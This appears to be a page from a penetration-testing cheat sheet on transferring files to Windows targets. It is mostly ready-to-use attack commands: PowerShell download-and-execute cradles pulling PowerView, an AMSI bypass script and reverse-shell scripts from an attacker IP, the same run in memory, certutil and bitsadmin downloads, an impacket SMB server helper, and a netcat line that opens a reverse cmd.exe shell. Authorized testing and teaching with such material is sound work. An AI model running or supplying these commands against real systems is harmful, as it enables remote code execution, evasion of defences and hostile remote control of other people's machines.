---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/file-transfer/window
---

# Window

### PowerShell

Download and execute (disk)

```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')"
```

Download and execute (memory) - short version

```bash
iex (iwr http://IP/amsi.ps1 -UseBasicParsing).Content
```

```bash
# Download and Execute on Memory
iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/PowerView.ps1');Get-NetComputer -Ping
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/rev.ps1') | powershell -noprofile -
```

```bash
# Download
Powershell -c Invoke-WebRequest "http: //10.10.10.10/rev.ps1" -OutFile C:\temp\rev.ps1
PS > (new-object net.webclient).downloadfile('http://10.10.10.10/shell.bat', 'C:\users\Public\shell.bat')

cmd > Powershell -c "(new-object net.webclient).downloadfile('http://10.10.10.10/shell.bat', 'C:\users\Public\shell.bat')"
cmd > powershell iwr http://10.10.10.10/file -OutFIle file1

# Wget
wget http://10.10.10.10/PowerView.ps1 -OutFile PowerView.ps1
```

### <sup>Certutil</sup>

```cmd
certutil -f -urlcache http://10.10.10.10/Powerview.ps1 C:\Users\Public\Powerview.ps1
```

### Impacket-smbserver

smbshare alias

```bash
smbshare() {
  local share_name="${1:-share}"
  local user="${2:-df}"
  local pass="${3:-df}"
  local ip="${4:-$(hostname -I | awk '{print $1}')}"
  local port="${5:-445}"

  smbserver.py -smb2support -username "$user" -password "$pass" -port "$port" "$share_name" . &
  local srv_pid=$!

  echo "[+] SMB server started"
  echo "    PID      : $srv_pid"
  echo "    Share    : $share_name"
  echo "    User     : $user"
  echo "    Password : $pass"
  echo "    IP       : $ip"
  echo "    Port     : $port"
  echo

  echo "[+] Run this on Windows:"
  echo "    net use \\\\$ip\\$share_name /user:$user $pass"
  echo "    cd \\\\$ip\\$share_name"
  echo

  # Optional: quick copy example
  echo "[+] Example file transfer:"
  echo "    copy file.txt \\\\$ip\\$share_name\\"
  echo

  # Cleanup helper
  echo "[*] To stop server: kill $srv_pid"

  disown "$srv_pid"
}
```

On Kali machine:

```bash
impacket-smbserver share /usr/share/windows-resources/binaries
```

Connect and execute from Window machine:

```bash
\\Kali-IP\share\nc.exe -e cmd.exe Kali-IP 4444
```

Map drive on Window

```bash
net use \192.168.39.161\share /user:df df
cd \192.168.39.161\share
```

### Bitsadmin

```basic
bitsadmin /transfer job http://10.10.10.10/file1 C:\users\bob\desktop\file1
```
